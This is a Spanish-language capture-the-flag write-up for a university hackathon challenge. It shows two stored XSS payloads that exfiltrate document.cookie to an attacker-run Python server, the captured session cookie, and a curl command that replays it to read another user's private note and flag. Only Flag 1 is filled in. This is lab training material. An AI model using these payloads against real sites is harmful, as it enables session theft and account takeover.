# Hackaton UdG - Reto 3

## Index

- [Flag 1](#flag-1)

- [Flag 2](#flag-2)

- [Flag 3](#flag-3)

### Flag 1 

Creamos un usuario, levantamos un servidor en python con `python -m http.server 6969` dentro de los upload, en el apartado de texto plano alguno de los siguientes **XSS**


```html
<!-- esta primera peude buggear la web, reinciadno la VM se arreglar -->
<img src=x onerror="document.location='http://10.0.2.15:6969/cookie?data='+document.cookie;">
<!-- segunda opción -->
<img src=x onerror="fetch('http://10.0.2.15:6969/cookie?data='+document.cookie)">
```

en nuestro servidor de **Python** vemos esta línea

```shell
10.0.2.12 - - [17/Mar/2025 23:01:59] "GET /cookie?data=NOTESAPP=29260242|asmith||author HTTP/1.1" 404 -

```
y con la cookie ya podemos lanzar un `curl` como la usuaria *Alice Smith* y ver que tiene en su blog

```shell
                                                                            
curl -b "NOTESAPP=29260242|asmith||author" http://10.0.2.12/notesapp/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<!-- Copyright 2017 Google Inc. -->
<html>
<head>
<title>Notes: Home</title>
<style>
...
...
  <tr>
    <td></td>
    <td>
      Private&nbsp;note&nbsp;
    </td>
    <td>
      <a class='button' id='show' onclick='_showHide("show", "hide")' href='#'>Show &#9658;</a>
      <span id='hide' style='display: none;'>
      <a class='button' onclick='_showHide("show", "hide")' href='#'>Hide &#9668;</a> &nbsp;
      <span id='private_note'>HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}</span></span>
    </td>
  </tr>
  <tr><td colspan='3'><hr></td></tr>

  <tr><td colspan='3'><b>Most recent notes:</b></td></tr>

...

</html>
```

**Flag 1:** `HACK{jckauGfFL5Xl2ovCTfR7sAaWAgAkHZx4SnC1n2Q6fvo}`


### Flag 2 


### Flag 3


